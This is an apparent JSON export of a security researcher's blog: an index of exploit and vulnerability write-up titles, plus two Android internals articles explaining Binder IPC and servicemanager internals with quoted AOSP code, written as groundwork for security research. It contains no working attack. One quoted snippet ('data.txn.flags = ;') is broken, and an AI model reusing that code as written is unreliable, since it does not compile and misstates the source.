{"/":{"title":"üëæ KIKS.","content":"\n## 2022\n- [[CVE-2022-2602 \u003e DirtyCred File Exploitation applied on an io_uring UAF]]\n- [[notes/Linux Kernel n-day exploit development]]\n- [[notes/Hunting for Linux Kernel public vulnerabilities]]\n- [[notes/KRWX - Kernel Read Write Execute]]\n\n## 2020\n- [[notes/Owncloud Multiple Vulnerabilities (CSRF, SSRF and Information Leak)]]\n- [[notes/Android Internals IPC - Introduction]]\n- [[notes/Android Internals IPC - Binder and Service Manager Perspective]]\n- [[notes/Moodle Server-Side Request Forgery (SSRF)]]\n\n## 2019\n- [[notes/TIM Mobile Phone Geolocalization]]\n- [[notes/Rusty Joomla Remote Code Execution]]\n\n## 2017\n- [[notes/How To Write FUD Malware (Thesis)]]\n## About Me\n- @kiks - Security Researcher.\n- Trying to break stuff since ~2k16.\n- [git/kiks7](https://github.com/kiks7)\n- [twitter](https://twitter.com/kiks7_7)\n\u003e This, the thrill of pwning a system, this is the greatest rush.","lastmodified":"2022-12-21T14:40:46.18257378Z","tags":null},"/notes/Android-Internals-IPC-Binder-and-Service-Manager-Perspective":{"title":"Android Internals IPC: Binder and Service Manager Perspective","content":"\n## Introduction\n\nAs mentioned in the previous article, Android uses the Binder for IPC communications. Good to know, the Binder was not created by Google. Its initial appearance was in BeOS, an old OS for mobile devices. After some acquisitions, original developers joined Android and took the Binder with them. The OpenBinder porting to Android was more implementation specific and it is a key component of the current Android OS. The official OpenBinder website is not up anymore, but there are some mirrors like [this one](http://www.angryredplanet.com/~hackbod/openbinder/docs/html/) that contain precious documentation. \n\n## High level overview\n\nBinder is a Kernel module written in C++, mainly responsible to let processes securely, transparently and easily communicate with each other using a client-server architecture. The simplicity on how processes can interact together is awful, a client application just needs to call a method provided by the service (that is the server in the client-side architecture) and everything in between is handled by the Binder. With ‚Äòeverything in between‚Äô I mean **Location**, **Delivery** and **credentials**.\n\n\n\nWhen a client needs to talk to a service, he needs to locate the target service (that is, the target process). The Binder is responsible to locate the service, handle the communication, deliver messages and check for caller privileges (Credentials).**The location stage is handled by the servicemanager** that acts as the endpoint mapper, it maintains a service directory that maps an interface name to a Binder handle. So, when the Binder receives a request for a specific service, it interrogates the servicemanager. The servicemanager will return a handle to it after some permission checks (for example the AID_ISOLATED mentioned in the first part) scrolling on its service list (aka service directory). If the client has permissions to interact with the requested service, the Binder will proxy the communication and deliver the message to the server, that will elaborate the request and return the result to the Binder, that will turn it to the client as a 'message'. These messages are technically called 'Parcel', containers that are written from both client and server in order to communicate serializing and deserializing necessary data (that can be parameters for clients and return values for services).\n\n![img1](/notes/images/android/2/1.png)\n\n## Binder Introduction\n\nLet's start with the main component of an IPC transaction, the Binder. As we said, the Binder is a small kernel module that lives in the kernel and acts as a messenger for clients and services. Every operation in Android goes through the Binder, and that's why two researchers, Nitay Artenstein and Idam Revivo, took an interesting talk at BH2014, *‚ÄòMan in the Binder: He Who Controls IPC, Controls the Droid*‚Äô ([Youtube Video](https://www.youtube.com/watch?v=O-UHvFjxwZ8\u0026t=418s)).\n\nThis research demonstrates an advanced post exploitation technique (a rootkit implant) where it is possible to sniff every data that uses IPC, in order to manipulate network traffic and sensitive information by hooking binder calls.\n\nThe character device at */dev/binder* is read/write by everyone, any process can perform read and write operations on it using *ioctl()*. The *ioctl()* responsible to handle the IPC connection from clients (applications) is located in the *'libbinder.so'* shared library, that is loaded in each application process. This library is responsible for the client initialization phase, setting up messages (aka Parcel) and talking with the binder module. We will deepen this specific library while talking, in next chapters, about the client and service implementations.\n\n## Binder interactions (userland --\u003e kerneland)\n\nFirst to introduce more concepts, let's first take an introduction on how a basic interaction works from userland to kerneland, from a client (or a service) to the binder kernel module. As a linux based OS, *ioctl* system call is used to talk with the kernel module using the special character file *'/dev/binder*'. The driver accepts different request codes:\n\n*BINDER_SET_MAX_THREAD*: Set limit thread numbers of a thread pool (deepened in the client/service implementation chapter) \n\n*BINDER_SET_CONTEXT_MGR*: Set the context manager (the service manager)\n\n*BINDER_THREAD_EXIT*: A thread exit the thread pool\n\n*BINDER_VERSION*: Get the Binder version\n\n*BINDER_WRITE_READ*: The most used code used for client and service requests \n\nWe will deepen all commands during these articles, but let's start with the *BINDER_WRITE_READ* request code.The binder module source code is at *drivers/android/binder.c*, here the *binder_ioctl()* is responsible to dispatch requests received from userland based on above request codes. In the case of a *BINDER_WRITE_READ* code, the *binder_ioctl_write_read()* is triggered and parameters are handled from userland to kerneland (and vice versa) using the *binder_write_read structure*:\n\n```CPP\n  struct binder_write_read {\n        signed long write_size;  // size of buffer by the client\n        signed long write_consumed;  // size of buffer by the binder\n        unsigned long   write_buffer;\n        signed long read_size;  // size of buffer by the client\n        signed long read_consumed;  // size of buffer by the binder\n        unsigned long   read_buffer;\n   };\n```\n\nIn this structure, we have 2 main divisions: **write and read items**. Write items (*write_size*, *write_consumed*, *write_buffer*) are used to send commands to the binder that it has to execute, meanwhile read items contain transactions from the binder to the clients that they have to execute (them whose *‚Äòioctl‚Äô* the binder). \n\nFor example, if a client needs to talk to a service, it will send a *binder_write_read* command with write items filled. When binder replies back, the client will have read items filled back. The same, a service waiting for client interactions, will receive transactions from the Binder with read items.\n\nWhile talking about 'clients', I don‚Äôt mean only application clients that need to perform a request in an IPC context. A client, in this context, is a process that *ioctl()* the binder. For example, a service waiting for transactions from an application is a client of the binder, because it calls *ioctl()* in order to receive actions.\n\n![img2](/notes/images/android/2/2.png)\n\nNote that in the case of a client, the *ioctl()* is performed when it is needed from the application (for example to perform an Inter Process Communication). Meanwhile, the service process has threads waiting in a loop for transactions from the binder.\n\nInside these read and write attributes we have more commands, that starts with *BC_** and *BR_**. The difference is in the way that the transaction is going, to or from the Binder. BR are commands received FROM the binder, while BC are commands SENT to the binder. To remind me about this difference, I think to them as they are 'BinderCall' (BC) and 'BinderReceive' (BR), but I think is not an official naming convention, so in case just use it as a reminder.\n\nAn example can be the most common *TRANSACTION*, we can have *BC_TRANSACTION* and *BR_TRANSACTION*.\n\n*BC_TRANSACTION* is used from clients to binder, while *BR_TRANSACTION* is used from the binder to its clients.\n\n\n\n### The Servicemanager\n\nAs was illustrated in the High Level overview, the servicemanager is responsible for the **location stage**. When a client needs to interact with a service (using the Binder), the Binder will ask the servicemanager for a handle to that service.\n\nThe servicemanager source code is located at *frameworks/native/cmds/servicemanager*/, where *service_manager.c* is responsible to initialize itself and handle service related requests. Meanwhile, in *binder.c* (inside that path, not the kernel module) we find the code responsible to handle the communication with the binder, parsing received requests from it and sending the appropriate replies. \n\nServicemanager is started at boot time as defined in */init.rc* file. This init file is part of the boot image and is responsible to load system partitions and binaries in the boot process:\n\n```javascript\n    /.../\n    # start essential services\n    start logd\n    start servicemanager\n    start hwservicemanager\n    start vndservicemanager\n    /.../\n\n  # When servicemanager goes down, restart all specified services\n    service servicemanager /system/bin/servicemanager\n    class core\n    user system\n    group system\n    critical\n    onrestart restart healthd\n    onrestart restart zygote\n    onrestart restart media\n    onrestart restart surfaceflinger\n    onrestart restart drm\n    onrestart restart perfhub\n    /.../\n```\n\nWhen the service manager is started, the *main* function obtains an handle to the binder ('*/dev/binder*') and successively call *binder_become_context_manager()*, that will *ioctl* the binder with the *BINDER_SET_CONTEXT_MGR* command, in order to declare itself as the context manager. \n\nThe **context manager** is crucial for the binder as it serves as the service locator. When the binder needs to locate a service, it asks for a handle to its context manager.Once the registration with the binder it's done, it calls *binder_loop* (from *binder.c*) with a callback function parameter. This callback (*svcmgr_handler*) will be responsible to handle service related requests.\n\nThe *binder_loop* assignment, as the name says, is to start an infinite loop that will receive requests from the binder. Before this loop, it will call the binder with BC_ENTER_LOOPER, to inform the binder that a specific thread is joining the thread pool. The **thread pool** is a group of threads that are waiting for incoming messages from the Binder, usually services have multiple threads in order to handle multiple requests. By the way, the service manager is a single-threaded service, so this is the first and unique thread. \n\nAfter this notification, the servicemanager starts its infinite loop that continuously asks the binder (using *ioctl*) waiting for actions. This is managed using the *BINDER_WRITE_READ* command (to the binder) with a *binder_write_read* structure that will be filled by the binder in its *read_** items, this is the structure:\n\n```cpp\nstruct binder_write_read {\n        signed long write_size;  // size of buffer by the client\n        signed long write_consumed;  // size of buffer by the binder\n        unsigned long   write_buffer;\n        signed long read_size;  // size of buffer by the client\n        signed long read_consumed;  // size of buffer by the binder\n        unsigned long   read_buffer;\n   };\n```\n\n\n\nWhen the binder needs the service manager to perform an action (e.g. getting a handle to a service) it will return to the *binder_loop()* a *binder_write_read* structure with *read_buffer* filled with the requested transaction (and in *read_consumed* its actual size). These two values are passed over the *binder_parse()* function that will start to ‚Äòdeserialize‚Äô the transaction *req*uest:\n\n```cpp\n  // .. /\n    uintptr_t end = ptr + (uintptr_t) size; // end calculated using the bwr.read_consumed\n    while (ptr \u003c end) {\n        uint32_t cmd = *(uint32_t *) ptr; // the command is read from the buffer\n        ptr += sizeof(uint32_t);\n    // switch case on the received command\n  switch(cmd) {\n    // BR_NOOP is a command\n        case BR_NOOP:\n            break;\n    //../\n```\n\nThe first 32 bits of the *bwr.read_buffer* contains the command to be executed (*CMD*).There is a huge list of handled commands: *BR_NOOP, BR_TRANSACTION_COMPLETE*, *BR_INCREFS - BR_ACQUIRE - BR_RELEASE, BR_DECREFS*, *BR_DEAD_BINDER*, *BR_FAILED_REPLY - BR_DEAD_REPLY*, *BR_TRANSACTION*, *BR_REPLY.*\n\nYou can find a lot more BR_* commands, but these are the only ones handled by the servicemanager. For example, a normal service can receive a *SPWAN_LOOPER* command from the binder, that requests the service to spawn a new thread in order to handle more requests. We said that the servicemanager is single thread, so there is no sense to receive this type of requests, so they are not handled. We will better deepen on these commands that are used by other services in *IPCThreadState.cpp* in next articles.\n\nAfter having extracted the command from the *binder_read_write* structure, this one is inserted in a switch case where above commands are managed. The most interesting one is the *BR_TRANSACTION*, because it means that the binder needs to retrieve a service handle or register a new service.\n\n\n\n### BR_TRANSACTION\n\nFollowing the source code, we can encounter and deppen some essentials structures, such as the *binder_transaction* data that is casted from *bwr.read_buffer* (now referenced in the local function as *ptr*) + *sizeof(uint32_t)*, that‚Äôs because the first 32 bits are dedicated to the command constant.\n\n```cpp \nstruct binder_transaction_data *txn = (struct binder_transaction_data *) ptr;\n```\n\n![img3](/notes/images/android/2/3.png)\n\nThis is the *binder_transaction_data* structure:\n\n```cpp\n\n//https://android.googlesource.com/kernel/msm/+/android-6.0.1_r0.74/drivers/staging/android/uapi/binder.h\nstruct binder_transaction_data {\n  /* The first two are only used for bcTRANSACTION and brTRANSACTION,\n   * identifying the target and contents of the transaction.\n   */\n  union {\n    __u32 handle; /* target descriptor of command transaction */\n    binder_uintptr_t ptr; /* target descriptor of return transaction */\n                // in BR_TRANSACTION this must be BINDER_SERVICE_MANAGER or the service_manager return -1\n  } target;\n  binder_uintptr_t  cookie; /* target object cookie */\n  __u32   code;   /* transaction command. */ // e.g. SVC_MGR_GET_SERVICE\n  /* General information about the transaction. */\n  __u32         flags;\n  pid_t   sender_pid;\n  uid_t   sender_euid;\n  binder_size_t data_size;  /* number of bytes of data */\n  binder_size_t offsets_size; /* number of bytes of offsets */\n  /* If this transaction is inline, the data immediately\n   * follows here; otherwise, it ends with a pointer to\n   * the data buffer.\n   */\n  union {\n    struct {\n      /* transaction data */\n      binder_uintptr_t  buffer;\n      /* offsets from buffer to flat_binder_object structs */\n      binder_uintptr_t  offsets;\n    } ptr;\n    __u8  buf[8];\n  } data;\n};\n\n```\n\nThis structure contains necessary information about the incoming request, such as the sender *PID* and *UID* to check permissions for a service, the *target descriptor* and the *transaction* command for the service manager (for example *PING_TRANSACTION* or *SVC_MGR_CHECK_SERVICE*).\n\nThis *binder_transaction_data* structure initializes a new *binder_io* (binder I/O) structure using *bio_init_from_txn()*, that will copy data and offsets from binder_transaction_data to this new one.\n\n```cpp\nstruct binder_io\n{\n    char *data;            /* pointer to read/write from */\n    binder_size_t *offs;   /* array of offsets */\n    size_t data_avail;     /* bytes available in data buffer */\n    size_t offs_avail;     /* entries available in offsets array */\n\n    char *data0;           /* start of data buffer */\n    binder_size_t *offs0;  /* start of offsets buffer */\n    uint32_t flags;\n    uint32_t unused;\n};\n```\n\n![img4](/notes/images/android/2/4.png)\n\n*bio_\\** functions refers to operations on the *binder_io* structure, here is an example on how the that structure is filled from *binder_transaction_data*:\n\n```cpp\nvoid bio_init_from_txn(struct binder_io *bio, struct binder_transaction_data *txn)\n{\n    bio-\u003edata = bio-\u003edata0 = (char *)(intptr_t)txn-\u003edata.ptr.buffer;\n    bio-\u003eoffs = bio-\u003eoffs0 = (binder_size_t *)(intptr_t)txn-\u003edata.ptr.offsets;\n    bio-\u003edata_avail = txn-\u003edata_size;\n    bio-\u003eoffs_avail = txn-\u003eoffsets_size / sizeof(size_t);\n    bio-\u003eflags = BIO_F_SHARED;\n}\n```\n\nAs we can see, buffer and offsets (including their size) of *binder_transaction_data* are filled in their relative *binder_io* structure, and both structures are passed over the service manager callback function (the *svcmgr_handler()* function defined in *service_manager.c* while calling *binder_loop()*):\n\n```cpp\nres = func(bs, txn, \u0026msg, reply);\n  // func  -\u003e binder_handle defined in service_manager.c - binder_loop(bs, svcmgr_handler);\n  // bs    -\u003e binder_state\n  // txn   -\u003e binder_transaction_data\n  // msg   -\u003e binder_io initialized from binder_transaction_data\n  // reply -\u003e an empty binder_io that will contain the reply from the service manager\n```\n\nNow, the *BR_TRANSACTION* is inside the *svcmgr_handler()*.\n\nThe *binder_transaction_data.ptr* must contain *BINDER_SERVICE_MANAGER* in order to continue (otherwise return -1) and *binder_transaction_data.code* contains the service manager command. These service commands (dispatched in a switch condition) can be:\n\nPING_TRANSACTION: It is a ping to the servicemanager, so return 0.\nSVC_MGR_GET_SERVICE - SVC_MGR_CHECK_SERVICE: Get a handle to a service. They follow the same switch path\nSVC_MGR_ADD_SERVICE - Add a new service\nSVC_MGR_LIST_SERVICES - List all available services\n\nLet's start to dig into SVC_MGR_GET_SERVICE.\n\n### SVC_MGR_GET_SERVICE\n\nThis service command occurs when the binder needs a service handle based on a service name (requested from a client).\n\nThe service name is taken from the *binder_io* structure (referred as `*msg*` in the source) using *bio_get_string16()*. \n\nWe have different functions as *bio_get_** (*bio_get_uint32*, *bio_get_string16*, *_bio_get_obj*, *bio_get_ref*). They are all primitives of *bio_get()* that retrieves the requested data type from (*binder_io*)*bio-\u003edata*. The same for bio_put_* functions in order to insert data in a *binder_io* structure while replying to a command.\n\n*do_find_service()* is called with the service name and the *caller UID* and *PID* from the *binder_transaction_data* structure and immediately call *find_svc()*, that will iterate its service singularly linked list and return an `svcinfo` structure if match the requested service name:\n\n```cpp\n{\n    struct svcinfo *next; // pointer to the next service\n    uint32_t handle;\n    struct binder_death death;\n    int allow_isolated;\n    uint32_t dumpsys_priority;\n    size_t len;\n    uint16_t name[0];\n} svcinfo;\n```\n\n![img6](/notes/images/android/2/5.png)\n\nThe svcinfo structure mainly contains information about the target service.\n\nIf the service matches the *svcinfo.name* item, the structure is returned to the *do_find_service()* function, that is responsible to perform extra checks.\n\nThe first check is about process isolation. As we were talking in the first part of this series, some services are not allowed to be called from isolated apps (such as. web browsers):\n\n```cpp\n  if (!si-\u003eallow_isolated) {\n        uid_t appid = uid % AID_USER;\n        if (appid \u003e= AID_ISOLATED_START \u0026\u0026 appid \u003c= AID_ISOLATED_END) {\n            return 0;\n        }\n    }\n```\n\nIn this piece of code, the UID retrieved from *binder_transaction_data* struct (coming from the binder) is verified against AID_ISOLATED_START and AID_ISOLATED_END. These UIDs (a range from 99000 to 99999) are associated with isolated processes and they can interact only with services with svcinfo.allow_isolated set to True.\n\nIf this check is passed, a SELINUX permission checks if the sender is allowed to retrieve the service, and the handler is returned to the main switch case in the service handler. The returned handle will be put inside the binder_io reply using `bio_put_ref()` and return 0, meaning everything is fine. Later on we will see how the message is sent back to the binder.\n\n### SVC_MGR_LIST_SERVICES\n\nWe can also list available services with the *SVC_MGR_LIST_SERVICES* command, that will iterate through the service list (svclist) and put the result in the *binder_io* reply message using *bio_put_string16()*. There is also an interesting condition on *dumpsys_priority*. The priority, that can be defined while registering a new service, can be of three levels: CRITICAL, HIGH and NORMAL. While listing all services, we can choose to dump only services with a specific priority (specified in the *svclist* structure). \n\nFor example, using the *dumpsys* utility in Android, we can specify the desired level:\n\n```\n\nadb \u003e `dumpsys -l --priority CRITICAL`\nCurrently running services:\n  SurfaceFlinger\n  activity\n  cpuinfo\n  input\n  notification\n  window\n\n`dumpsys -l --priority HIGH`\nCurrently running services:\n  connectivity\n  meminfo\n\nadb \u003e `dumpsys -l --priority NORMAL`\nCurrently running services:\n  activity\n  connectivity\n  notification\n```\n\n\n\n### SVC_MGR_ADD_SERVICE\n\nIf the requested command from the binder is *SVC_MGR_ADD_SERVICE*, the binder is proxying a client request to register a new service. Details about the new service are taken from the *binder_io* message (*binder_io-\u003edata*). Service attributes are the service name, the priority level (*dumpsys_priority*), the handle and if it is permitted to interact with the service from isolated apps (*allow_isolation*). The function *do_add_service()* is called with these information and the caller UID and PID from the *binder_transaction_data* message.\n\nThis function is responsible to check for caller permissions (the process that requests the registration), starting by checking its UID to avoid the creation of a new service from standard applications. This is accomplished by checking if the AID_APP is over 10000.\n\nIn Android, installed applications start from UID 10000, so the condition is aimed to prevent an user application from installing a new service (or override an existing one). That also means that the privileged *system* user (with UID 1000) can register a new service. \n\nIf this condition is satisfied, a SELINUX check controls that the caller process has 'add' permissions. If the caller process has rights to register a new service, *find_svc()* checks if the service name has been already registered. If it already exists, the service handle is overridden with the new one, and *svcinfo_death()* called. \n\nBefore going in depth with this function behaviour, let's introduce the scenario where the service does not exist:\n\n\n\n```cpp\nstruct svcinfo *si;\n    /../\n      si-\u003ehandle = handle;\n        si-\u003elen = len;\n        memcpy(si-\u003ename, s, (len + 1) * sizeof(uint16_t));\n        si-\u003ename[len] = '\\0';\n        si-\u003edeath.func = (void*) svcinfo_death;\n        si-\u003edeath.ptr = si;\n        si-\u003eallow_isolated = allow_isolated;\n        si-\u003edumpsys_priority = dumpsys_priority;\n        si-\u003enext = svclist;\n        svclist = si;\n        /../\n\n```\n\n\n![img6](/notes/images/android/2/6.png)\n\nThe code is pretty self-explanatory, it is populating the new structure with input values and updates its service list with `*si-\u003enext = svclist*` and `*svclist = si* ` (linked list behavior). And here, we are back with the death that we were talking some lines above.\n\nThe *binder_death* structure, part of the *svclist*, contains two items, func and ptr. The *ptr* is a pointer to its service structure (itself), and the *func* is a function pointer pointing to *svcinfo_death()*. \n\nThis death function sets the service handle to 0 and informs the binder that the service is dead using a *BC_RELEASE* with the service handle as parameter, so the binder can release this reference. The binder can use this information to also inform associated clients that the service is down using *BR_BINDER_DOWN*, if clients requested for it (by sending a *BC_REQUEST_DEATH_NOTIFICATION* for the service to the binder). \n\nOn the other side, when a service is registered or overridden, a *BC_ACQUIRE* with the service handle as parameter is sent to the binder, also with the BC_REQUEST_DEATH_NOTIFICATION in case the service goes down (for example if its crashes).\n\n### Comeback to the service handler\n\nWhen one of these described commands are executed, the Binder usually expects a reply back. While handling commands, *SVC_MGR_ADD_SERVICE* puts 0 in reply message if success (bio_put_uint32(reply, 0);) or simply return -1 if something fail, and the binder will receive an empty reply (that was previously initialized using *bio_init())*.\n\n*SVC_MGR_GET_SERVICE* and *SVC_MGR_LIST_SERVICES* act in the same way if something goes wrong (-1 and empty reply packet), or they will return 0 to the function after have filled the reply packet with necessary values (handle in case of get service, and the list of services for the service list command).\n\nWhen the service handler returns, the execution flow comes back inside the `*binder_parse()*` function (in the *BR_TRANSACTION* switch case) with the reply packet and the result value of the servicemanager handler. Based on the *binder_transaction_data.flags*, if *TF_ONE_WAY* is set, means that is an asynchronous call, the binder does not expect a reply, so the servicemanager will inform the binder to free the *binder_transaction_data.ptr.buffer* with a *BC_FREE_BUFFER* command (internally using the *binder_free_buffer()* function). If it's not an asynchronous call, it will send the reply back to the binder using *binder_send_reply()* that will send a *BC_REPLY* command.\n\nAlso, as you could notice, all these functions (*binder_send_reply*, *binder_free_buffer*, ..) are meant to be easily called inside the source code, and will perform all setup operations to interact with the binder with the final *ioctl()*. Let's take a simple example of the binder_free_buffer mentioned before.\n\n```cpp\nvoid binder_free_buffer(struct binder_state *bs,\n                        binder_uintptr_t buffer_to_free)\n{\n    struct {\n        uint32_t cmd_free;\n        binder_uintptr_t buffer;\n    } __attribute__((packed)) data;\n\n    data.cmd_free = BC_FREE_BUFFER;\n    data.buffer = buffer_to_free;\n    binder_write(bs, \u0026data, sizeof(data));\n}\n```\n\nThis function, previously used by the service manager handler to inform the binder to free a buffer, will setup, using a *data* structure, a *cmd_free* with *BC_FREE_BUFFER* on it and the buffer to free, then call *binder_write()*. *binder_write* is the final function that will put received input inside a binder_write_read.write_buffer structure before ioctl the binder with the *BINDER_WRITE_READ* command:\n\n```cpp\nint binder_write(struct binder_state *bs, void *data, size_t len)\n{\n    struct binder_write_read bwr;\n    int res;\n\n    bwr.write_size = len;\n    bwr.write_consumed = 0;\n    bwr.write_buffer = (uintptr_t) data;\n    bwr.read_size = 0;\n    bwr.read_consumed = 0;\n    bwr.read_buffer = 0;\n    res = ioctl(bs-\u003efd, BINDER_WRITE_READ, \u0026bwr);\n    if (res \u003c 0) {\n        fprintf(stderr,\"binder_write: ioctl failed (%s)\\n\",\n                strerror(errno));\n    }\n    return res;\n}\n```\n\nWe can note the differences on the usage of the *binder_write_read* structure now and before.When we were expecting an action from the binder (in the *binder_loop*) the received action was inside the *read_buffer* (that contains the BR_* command). Now, the binder needs to perform actions based on our input, so we are using the *write_buffer* (with a a BC_* command).\n\nSaid that, we can come back inside the *binder_send_reply()*, that is responsible to send the reply of performed actions to the Binder. This is the source code:\n\n```¬†cpp\n\nvoid binder_send_reply(struct binder_state *bs,\n                       struct binder_io *reply,\n                       binder_uintptr_t buffer_to_free,\n                       int status)\n{\n    struct {\n        uint32_t cmd_free;\n        binder_uintptr_t buffer;\n        uint32_t cmd_reply;\n        struct binder_transaction_data txn;\n    } __attribute__((packed)) data;\n\n    data.cmd_free = BC_FREE_BUFFER;\n    data.buffer = buffer_to_free;\n    data.cmd_reply = BC_REPLY;\n    data.txn.target.ptr = 0;\n    data.txn.cookie = 0;\n    data.txn.code = 0;\n    if (status) {\n      // the svcmgr_handler return -1\n        data.txn.flags = ;\n        data.txn.data_size = sizeof(int);\n        data.txn.offsets_size = 0;\n        data.txn.data.ptr.buffer = (uintptr_t)\u0026status;\n        data.txn.data.ptr.offsets = 0;\n    } else {\n      // the svcmgr_handler return 0\n        data.txn.flags = 0;\n        data.txn.data_size = reply-\u003edata - reply-\u003edata0;\n        data.txn.offsets_size = ((char*) reply-\u003eoffs) - ((char*) reply-\u003eoffs0);\n        data.txn.data.ptr.buffer = (uintptr_t)reply-\u003edata0;\n        data.txn.data.ptr.offsets = (uintptr_t)reply-\u003eoffs0;\n    }\n    binder_write(bs, \u0026data, sizeof(data));\n}\n\n```\n\n\n\nNote the declared *data* structure, it contains an integer *cmd_free* (that will be *BC_FREE_BUFFER*), the *buffer*, the *cmd_reply* (that will be *BC_REPLY*) and a *binder_transaction_data* structure. \n\nThe buffer to free is *binder_transaction_data.data.ptr.buffer* (previously casted in *binder_io*. it contains '*parameters*', for example a service name for the servicemanager) and then the structure is filled based on the *status* value. \n\nThe status value is the return value from the servicemanager handler (svcmgr_handler) that can be 0 if everything was fine (and the reply was filled) or -1 if something went wrong. \nIf the result is -1, this result is copied inside the data.txn.data.ptr.buffer (so inside the binder_transaction_data of the data structure). \n\nIf the result of the service manager handler was fine (0), the binder_transaction_data is filled with reply's data/offset buffers and passed over the binder_write() function, that, as explained before, will take the data structure and put it in binder_write_read.write_buffer before calling ioctl() with the BINDER_WRITE_READ command.\n\n## Little resume\n\nThe servicemanager is started by the init process (as defined in /init.rc) and first of all it becomes the context manager for the binder. Then he notices the binder that will enter an infinite loop (*BC_ENTER_LOOPER*) and starts to read and parse operations delivered from the binder. When such events are related to service lookup or service registration (*SVC_MGR_GET_SERVICE* and *SVC_MGR_ADD_SERVICE*) the binder request the servicemanager for a *BR_TRANSACTION* with one of these commands inside its *binder_transaction_data* structure. The servicemanager checks for necessary rights on the caller process (information sent from the binder) and, in the case of a service lookup, returns an handle to the binder. When it's done, the reply is sent to the binder using *ioctl* with *BINDER_WRITE_READ* with the reply inside the *write_buffer* and the *BC_REPLY* command.\n\n## Conclusions\n\nIn this post, we concentrated on transactions between the Binder and the servicemanager, a crucial component for IPC.","lastmodified":"2022-12-21T14:40:46.18257378Z","tags":null},"/notes/Android-Internals-IPC-Introduction":{"title":"Android Internals IPC: Introduction","content":"\n## Introduction\nIn the last few months I was studying Android Internals in order to perform some security research in the future. I first tried to focus myself in its architecture and fundamentals components, starting from the bootloader stage to the Framework, in order to have an initial high level picture. Then, I focused on the Binder component for two reasons:\n- It is one of the main Android components, vital for its functionalities, as it is the IPC core.\n- In that period Google P0 discovered a 0day in the wild used in a chain to compromise the Android System. The Binder was impacted allowing LPE as root also from an isolated process (that means it is for sure a good attack vector)\n\n\nDuring this studying process, I took a lot of messy notes, so after 1/2 months of not working anymore on Android, I took them back, put them in order, studied again (adding more messy notes) and decided to write this little series of articles. So, especially the second and the third sections contain theory concepts, high level functionalities and a lot of source code references. Parts of these articles can be considered as a ‚ÄòCode Walkthrough‚Äô, so having the actual Android Source Code (the online Android repository is enough) is highly suggested to understand the flow.\nI didn‚Äôt want to repost other people's work, so this ‚Äòcode walkthrough‚Äô is something different that honestly could help me when I was starting on it, so I hope it can help others too. It could not be perfect, so feel free to appoints something at \u003calessandro [at] hacktivesecurity.com\u003e and I will of course consider them.\nBy the way, all references are at the bottom of each article.\n\nIn this first section, I will introduce some basic Android concepts that will be useful for next chapters. The second will deepen Binder interactions and the servicemanager. And last, but not least, the client and service IPC implementation and usage.\n\n## IPC Introduction\nInter-Process Communication is a necessary and indispensable feature for every Operating System in order to let processes communicate with each other. That means, if Process A needs to communicate with Process B (synchronize, share data, .. ), the OS must provide capabilities to do that.\nWe have multiple and different solutions that we can apply depending on the underlying OS, they can be through Pipes, Sockets, Shared Files, Shared Memory and more. These implementations are out of scope of this article‚Äôs series, so these are well-written reference:\n\n- Linux: [https://www.geeksforgeeks.org/inter-process-communication-ipc/](https://www.geeksforgeeks.org/inter-process-communication-ipc/)\n- OSX: [https://developer.apple.com/documentation/uikit/inter-process_communication](https://developer.apple.com/documentation/uikit/inter-process_communication)\n- Windows: [https://docs.microsoft.com/en-us/windows/win32/ipc/interprocess-communications](https://docs.microsoft.com/en-us/windows/win32/ipc/interprocess-communications)\n\nIn order to go over the IPC implementation in Android, let‚Äôs make a short introduction to Android functionalities and some security aspects that will be useful during the reading.\n\n## Android and Linux\nStarting from the classic. Android is a Linux kernel based distribution aimed for mobile devices. I cannot explain better than how was explained in *‚ÄòAndroid Internals‚Äô* by ‚ÄòJonathan Levin‚Äô:\n\n*‚ÄúAndroid's novelty arises from what it aims to provide -**not just another Linux distribution** - but a full software stack. The term \"stack\" implies several layers. **Android provides not just the basic kernel and shell binaries, but also a self-contained GUI environment, and a rich set of frameworks**. Coupled with a simple to use development language - Java - Android gives developers a true **Rapid Application Development (RAD) environment**, as they can draw on prewritten, well-tested code in the frameworks to access advanced functionality - such as Cameras, motion sensors, GUI Widgets and more - in a few lines of code‚Äù*\n\nOne of the biggest differences with Linux is **Bionic** has its core runtime C library, instead of the standard GNU libC (Glibc). Bionic is lighter and more focused on Android‚Äôs needs. There are a lot of changes between them. Today we are focused on IPC, so the difference in our interest is the omission of the System-V IPC (message queues, shared memory and semaphores), that are omitted because Android chooses its own IPC mechanism, the **Binder**. The Binder is a kernel component, the core component of IPC, that enables different processes to communicate with each other using a client-server architecture. It‚Äôs the core theme of this series, so we will deppen in later chapters.\n\n## Dalvik and ART\nJust to be aligned, let‚Äôs spend some words about the Dalvik Virtual Machine and ART, which are the core of Android.\nIf you know how Java works, you also know that in order to execute the code you need the JVM (**J**ava **V**irtual **M**achine) that will execute the compiled bytecode, translating it to machine code.\nWell, Dalvik follows the same concept, but it‚Äôs not the same!\nThe Dalvik VM runs a different type of bytecode, called DEX (**D**alvik **E**xecutable) that is more optimized for efficiency in order to run faster on low performance hardware as it is for mobile devices. It is a Just In Time (JIT) compiler, that means that the code is compiled dynamically when it needs to be executed.\n**A**ndroid **R**un**T**ime (ART) is used for the same purpose: translate bytecode to machine code and execute it.\nBy the way, it uses a different approach instead of JIT compiling , it uses **A**head **O**f **T**ime (AOT) that translates the whole DEX into machine code (dex2oat) at installation time when the APK is installed or when the device is idle. That means that is much more faster at execution time, but also requires more physical space.\n\nDalvik is the predecessor of ART. ART has been introduced in Android 4.4 (KitKat) and started to use hybrid combination of AOT and JIT from Android 7.0 (Nougat), starting to follows a different compilation approach, synthesizing:\n\n- The first few times the application runs, the app is executed through JIT compilation.\n- When the device is idle or charging, a daemon performs compilation using AOT on frequently used code, based on a profile compilation generated from the first run\n\nYou can find these profiles for each installed application inside */data/dalvik-cache/profiles/*:\n\n![img1](/notes/images/android/1/1.png)\n\n## Android Framework and abstraction\nDevelopers can access complex functionalities with few lines of code using pre-written code that resides in the Framework, delivered in packages that start with com.android.\\* . These packages can be for different scopes, such as location and application support (*android.location* and *android.app*) Network (*android.net*) and in our interest, IPC support and core OS services from android.os. ([developer.android.com/packages](https://developer.android.com/reference/packages.html) for more).\nThis is a high advantage from the Security Perspective. Usually, developers do not have to bother with native languages (avoiding common memory corruption issues) and instead use a well tested code, also when they need to perform advanced or low level functionalities (such as access an hardware peripheral) they can stay in an High Level, Memory Safe language.\n\nLet‚Äôs take a quick example on how to interact with the WiFi component, supposing we need to retrieve the actual WiFi state:\n\n```\nimport android.net.Wifi \n// Get an handle to the WiFi Service\n[..]\nWifiManager Wifi_manager = (WifiManager) 